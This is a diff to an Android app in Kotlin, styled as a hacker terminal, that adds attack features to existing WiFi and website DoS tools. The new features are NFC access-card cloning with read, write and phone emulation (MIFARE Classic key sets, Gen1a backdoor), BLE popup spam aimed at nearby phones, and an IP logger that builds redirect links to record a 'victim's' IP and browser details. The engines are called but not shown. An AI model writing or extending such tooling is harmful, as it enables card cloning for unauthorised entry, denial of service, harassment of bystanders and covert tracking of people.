@@ -1,13 +1,17 @@
 package com.twks.wifi
 
 import android.Manifest
+import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
+import android.nfc.NfcAdapter
+import android.nfc.Tag
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Toast
@@ -30,11 +34,17 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
+import java.io.File
 
 class MainActivity : ComponentActivity() {
     private val locationPermissionRequest = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { isGranted -> if (!isGranted) finish() }
+
+    private var nfcAdapter: NfcAdapter? = null
+    private var pendingIntent: PendingIntent? = null
+    private var intentFiltersArray: Array<IntentFilter>? = null
+    private var techListsArray: Array<Array<String>>? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -59,6 +69,22 @@ class MainActivity : ComponentActivity() {
             }
         } catch (e: Exception) {}
 
+        if (android.os.Build.VERSION.SDK_INT >= 31) {
+            try {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
+                    requestPermissions(arrayOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT), 2)
+                }
+            } catch (e: Exception) {}
+        }
+
+        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
+        pendingIntent = PendingIntent.getActivity(
+            this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP),
+            PendingIntent.FLAG_MUTABLE
+        )
+        intentFiltersArray = arrayOf(IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED))
+        techListsArray = arrayOf(arrayOf("android.nfc.tech.MifareClassic"), arrayOf("android.nfc.tech.NfcUltralight"))
+
         setContent {
             MaterialTheme(colors = darkColors(background = Color.Black, primary = Color(0xFF00FF41), onBackground = Color(0xFF00FF41))) {
                 TerminalApp(this)
@@ -66,10 +92,60 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    override fun onResume() {
+        super.onResume()
+        nfcAdapter?.enableForegroundDispatch(this, pendingIntent, intentFiltersArray, techListsArray)
+    }
+
+    override fun onPause() {
+        super.onPause()
+        nfcAdapter?.disableForegroundDispatch(this)
+    }
+
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        if (NfcAdapter.ACTION_TECH_DISCOVERED == intent.action) {
+            val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG)
+            tag?.let { handleTag(it) }
+        }
+    }
+
+    private fun handleTag(tag: Tag) {
+        when (cardMode) {
+            "READ" -> {
+                val dump = CardCloner.readCard(tag)
+                if (dump != null) {
+                    lastDump = dump
+                    runOnUiThread {
+                        Toast.makeText(this, "Card read: ${dump.uid.joinToString("") { "%02X".format(it) }}", Toast.LENGTH_SHORT).show()
+                    }
+                } else {
+                    runOnUiThread {
+                        Toast.makeText(this, "Read failed: unsupported or locked card", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+            "WRITE" -> {
+                lastDump?.let { dump ->
+                    val success = CardCloner.writeCard(tag, dump)
+                    runOnUiThread {
+                        Toast.makeText(this, if (success) "Write OK" else "Write failed", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+        }
+    }
+
+    companion object {
+        var cardMode: String = ""
+        var lastDump: CardDump? = null
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         FloodEngine.stopFlood()
         SiteFloodEngine.stopFlood()
+        BleSpam.stop()
         try {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
             cm?.bindProcessToNetwork(null)
@@ -112,7 +188,10 @@ fun TerminalApp(context: ComponentActivity) {
             when (screen) {
                 "MAIN_MENU" -> MainMenuScreen(
                     onWiFiDoS = { screen = "WIFI_MENU" },
-                    onSiteDoS = { screen = "SITE_ATTACK" }
+                    onCloneCard = { screen = "CLONE_CARD" },
+                    onSiteDoS = { screen = "SITE_ATTACK" },
+                    onBleSpam = { screen = "BLE_SPAM" },
+                    onIpLogger = { screen = "IP_LOGGER" }
                 )
                 "WIFI_MENU" -> WiFiMenuScreen(
                     onSelectTarget = { screen = "WIFI_TARGETS" },
@@ -131,27 +210,48 @@ fun TerminalApp(context: ComponentActivity) {
                 )
                 "WIFI_ATTACK" -> WiFiAttackScreen(onBack = { screen = "WIFI_MENU" })
                 "SITE_ATTACK" -> SiteAttackScreen(onBack = { screen = "MAIN_MENU" })
+                "CLONE_CARD" -> CloneCardScreen(onApdu = { screen = "APDU_LOG" }, onBack = { screen = "MAIN_MENU" })
+                "APDU_LOG" -> ApduLogScreen(onBack = { screen = "CLONE_CARD" })
+                "BLE_SPAM" -> BleSpamScreen(onBack = { screen = "MAIN_MENU" })
+                "IP_LOGGER" -> IpLoggerScreen(onBack = { screen = "MAIN_MENU" })
             }
         }
     }
 }
 
 @Composable
-fun MainMenuScreen(onWiFiDoS: () -> Unit, onSiteDoS: () -> Unit) {
-    Column {
-        Text("TWKS_WIFI // MAIN MENU", color = Green, fontSize = 16.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
-        Spacer(modifier = Modifier.height(8.dp))
-        Divider(color = DimGreen, thickness = 1.dp)
-        Spacer(modifier = Modifier.height(32.dp))
+fun MenuRow(num: String, label: String, onClick: () -> Unit) {
+    Button(onClick = onClick, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 5.dp)) {
+        Row {
+            Text("[ $num ] ", color = DimGreen, fontSize = 18.sp, fontFamily = FontFamily.Monospace)
+            Text(label, color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+            Text("  >>>", color = DimGreen, fontSize = 18.sp, fontFamily = FontFamily.Monospace)
+        }
+    }
+}
 
-        Button(onClick = onWiFiDoS, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp)) {
-            Text("[ 01 ] WiFi DoS", color = Green, fontSize = 20.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
-        }
-        Button(onClick = onSiteDoS, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp)) {
-            Text("[ 02 ] Site DoS", color = Green, fontSize = 20.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
-        }
+@Composable
+fun MainMenuScreen(onWiFiDoS: () -> Unit, onCloneCard: () -> Unit, onSiteDoS: () -> Unit, onBleSpam: () -> Unit, onIpLogger: () -> Unit) {
+    val ctx = LocalContext.current
+    var btOn by remember { mutableStateOf(false) }
+    var wifiOn by remember { mutableStateOf(false) }
+    LaunchedEffect(Unit) {
+        val bm = ctx.getSystemService(Context.BLUETOOTH_SERVICE) as? android.bluetooth.BluetoothManager
+        btOn = bm?.adapter?.isEnabled == true
+        wifiOn = NetworkEngine.isConnectedToWifi(ctx)
+    }
+    Column {
+        Text("┌─[ TWKS WIFI // v4.9.0 ]───────┐", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+        Text("│ wifi · nfc · site · ble · ip  │", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+        Text("└───────────────────────────────┘", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+        Spacer(modifier = Modifier.height(20.dp))
+        MenuRow("01", "WIFI DOS", onWiFiDoS)
+        MenuRow("02", "NFC CLONE", onCloneCard)
+        MenuRow("03", "SITE DOS", onSiteDoS)
+        MenuRow("04", "BLE SPAM", onBleSpam)
+        MenuRow("05", "IP LOGGER", onIpLogger)
         Spacer(modifier = Modifier.weight(1f))
-        Text("v4.2.0 // wifi: 192 thr burst // site: 128 thr x3 vectors", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        Text("BT: ${if (btOn) "ON" else "OFF"} · WIFI: ${if (wifiOn) "ON" else "OFF"}", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
     }
 }
 
@@ -371,5 +471,263 @@ fun VectorChip(label: String, selected: Boolean, onClick: () -> Unit) {
             fontFamily = FontFamily.Monospace,
             fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal
         )
+    }
+}
+
+@Composable
+fun CloneCardScreen(onApdu: () -> Unit, onBack: () -> Unit) {
+    val ctx = LocalContext.current
+    var status by remember { mutableStateOf("Ready") }
+    var dumpInfo by remember { mutableStateOf<String?>(null) }
+    val scope = rememberCoroutineScope()
+
+    LaunchedEffect(MainActivity.lastDump) {
+        MainActivity.lastDump?.let { dump ->
+            dumpInfo = "UID: ${dump.uid.joinToString("") { "%02X".format(it) }}\n" +
+                    "ATQA: ${dump.atqa.joinToString("") { "%02X".format(it) }}\n" +
+                    "SAK: %02X".format(dump.sak) + "\n" +
+                    "Sectors: ${dump.sectors.size} | Opened: ${dump.sectors.count { it.blocks.isNotEmpty() }}/${dump.sectors.size}"
+        }
+    }
+
+    Column {
+        TopBar("CLONE CARD") { onBack() }
+
+        Text(status, color = Gold, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
+        Spacer(modifier = Modifier.height(16.dp))
+
+        dumpInfo?.let { info ->
+            Text("DUMP LOADED:", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+            Text(info, color = DimGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
+            Spacer(modifier = Modifier.height(16.dp))
+        }
+
+        Button(onClick = {
+            MainActivity.cardMode = "READ"
+            status = "Bring card to NFC reader..."
+            scope.launch {
+                delay(30000)
+                if (MainActivity.cardMode == "READ") {
+                    MainActivity.cardMode = ""
+                    status = "Timeout"
+                }
+            }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
+            Text("[ READ CARD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(
+            onClick = {
+                if (MainActivity.lastDump != null) {
+                    MainActivity.cardMode = "WRITE"
+                    status = "Bring target card to NFC reader..."
+                    scope.launch {
+                        delay(30000)
+                        if (MainActivity.cardMode == "WRITE") {
+                            MainActivity.cardMode = ""
+                            status = "Timeout"
+                        }
+                    }
+                } else {
+                    status = "No dump loaded"
+                }
+            },
+            enabled = MainActivity.lastDump != null,
+            colors = ButtonDefaults.buttonColors(backgroundColor = if (MainActivity.lastDump != null) Green else DimGreen),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Text("[ WRITE CARD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(onClick = {
+            MainActivity.lastDump?.let { dump ->
+                val file = File(ctx.filesDir, "card_dump.bin")
+                CardCloner.saveDump(file, dump)
+                status = "Saved to ${file.absolutePath}"
+            } ?: run { status = "No dump to save" }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
+            Text("[ SAVE DUMP ]", color = Color.Black, fontFamily = FontFamily.Monospace)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(onClick = {
+            val file = File(ctx.filesDir, "card_dump.bin")
+            if (file.exists()) {
+                MainActivity.lastDump = CardCloner.loadDump(file)
+                status = "Loaded from ${file.absolutePath}"
+            } else {
+                status = "No saved dump found"
+            }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
+            Text("[ LOAD DUMP ]", color = Color.Black, fontFamily = FontFamily.Monospace)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+        Button(onClick = onApdu, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth()) {
+            Text("[ APDU LOG ]", color = DimGreen, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
+        }
+
+        Spacer(modifier = Modifier.weight(1f))
+        Text("PHONE-AS-CARD: HCE live. With dump loaded and screen on, phone answers APDU-readers as this card.", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        Spacer(modifier = Modifier.height(4.dp))
+        Text("Supports MIFARE Classic 1K/4K + Ultralight, mfoc key set, Gen1a backdoor", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+    }
+}
+
+@Composable
+fun ApduLogScreen(onBack: () -> Unit) {
+    val ctx = LocalContext.current
+    var lines by remember { mutableStateOf<List<String>>(emptyList()) }
+    LaunchedEffect(Unit) {
+        lines = try { File(ctx.filesDir, "apdu_log.txt").readLines().takeLast(60) } catch (e: Exception) { emptyList() }
+    }
+    Column {
+        TopBar("APDU LOG") { onBack() }
+        if (lines.isEmpty()) {
+            Text("No reader requests logged yet. Tap phone to a reader with dump loaded.", color = DimGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
+        }
+        LazyColumn {
+            items(lines) { l ->
+                Text(l, color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+            }
+        }
+    }
+}
+
+@Composable
+fun BleSpamScreen(onBack: () -> Unit) {
+    val ctx = LocalContext.current
+    var mode by remember { mutableStateOf(0) }
+    var running by remember { mutableStateOf(false) }
+    val names = listOf("APPLE", "ANDROID", "SAMSUNG", "WINDOWS", "MIX")
+    var status by remember { mutableStateOf(BleSpam.status) }
+
+    LaunchedEffect(running) {
+        while (running && currentCoroutineContext().isActive) {
+            status = BleSpam.status
+            delay(500)
+        }
+        status = BleSpam.status
+    }
+
+    Column {
+        TopBar("BLE SPAM") {
+            if (running) { BleSpam.stop(); running = false }
+            onBack()
+        }
+        Text("TARGET OS:", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            names.forEachIndexed { i, n ->
+                VectorChip(n, mode == i) { if (!running) mode = i }
+            }
+        }
+        Spacer(modifier = Modifier.height(12.dp))
+        Text("STATUS: $status", color = if (running) Green else Gold, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
+        Text("Targets must be UNLOCKED with screen ON to show popups.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        Text("If STATUS says NO PERM: tap EXECUTE again after the dialog.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        Text("Lab use: your own devices and consenting friends.", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        Spacer(modifier = Modifier.weight(1f))
+
+        if (running) {
+            Button(onClick = {
+                BleSpam.stop()
+                running = false
+            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
+                Text("[ ABORT SPAM ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+            }
+        } else {
+            Button(onClick = {
+                if (BleSpam.needsPermission(ctx)) {
+                    (ctx as? ComponentActivity)?.requestPermissions(
+                        arrayOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT), 2
+                    )
+                }
+                BleSpam.start(ctx, mode)
+                running = true
+            }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
+                Text("[ EXECUTE SPAM ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+            }
+        }
+    }
+}
+
+@Composable
+fun IpLoggerScreen(onBack: () -> Unit) {
+    var target by remember { mutableStateOf("https://") }
+    var link by remember { mutableStateOf<String?>(null) }
+    var logs by remember { mutableStateOf(listOf<LogEntry>()) }
+    var status by remember { mutableStateOf("") }
+    val scope = rememberCoroutineScope()
+
+    LaunchedEffect(Unit) {
+        while (currentCoroutineContext().isActive) {
+            delay(10000)
+            if (IpLogger.token != null) logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
+        }
+    }
+
+    Column {
+        TopBar("IP LOGGER") { onBack() }
+
+        OutlinedTextField(
+            value = target,
+            onValueChange = { target = it },
+            label = { Text("Redirect target (victim lands here)", color = DimGreen, fontFamily = FontFamily.Monospace) },
+            colors = TextFieldDefaults.outlinedTextFieldColors(
+                textColor = Green,
+                focusedBorderColor = Green,
+                unfocusedBorderColor = DimGreen,
+                cursorColor = Green
+            ),
+            modifier = Modifier.fillMaxWidth(),
+            singleLine = true
+        )
+        Spacer(modifier = Modifier.height(12.dp))
+
+        Button(onClick = {
+            scope.launch {
+                status = "CREATING..."
+                val ok = withContext(Dispatchers.IO) { IpLogger.create(target) }
+                link = ok?.let { IpLogger.loggerUrl() }
+                status = if (link != null) "LOGGER LIVE" else "CREATE FAILED"
+            }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
+            Text("[ CREATE LOGGER ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(onClick = {
+            scope.launch {
+                val l = link ?: return@launch
+                status = withContext(Dispatchers.IO) { IpLogger.selfTest(l) }
+                logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
+            }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
+            Text("[ SELF TEST ]", color = Color.Black, fontFamily = FontFamily.Monospace)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Text(status, color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        link?.let { l ->
+            Text("LINK: $l", color = Green, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+            Text("Click = IP + UA + referer logged, then 302 to target.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+        }
+        Spacer(modifier = Modifier.height(12.dp))
+
+        Button(onClick = {
+            scope.launch {
+                logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
+            }
+        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
+            Text("[ REFRESH LOGS ]", color = Color.Black, fontFamily = FontFamily.Monospace)
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        LazyColumn(modifier = Modifier.weight(1f)) {
+            items(logs) { e ->
+                Text("${e.date} | ${e.ip} | ${e.ua.take(38)} | ref:${e.referer.take(18)}", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+            }
+        }
     }
 }
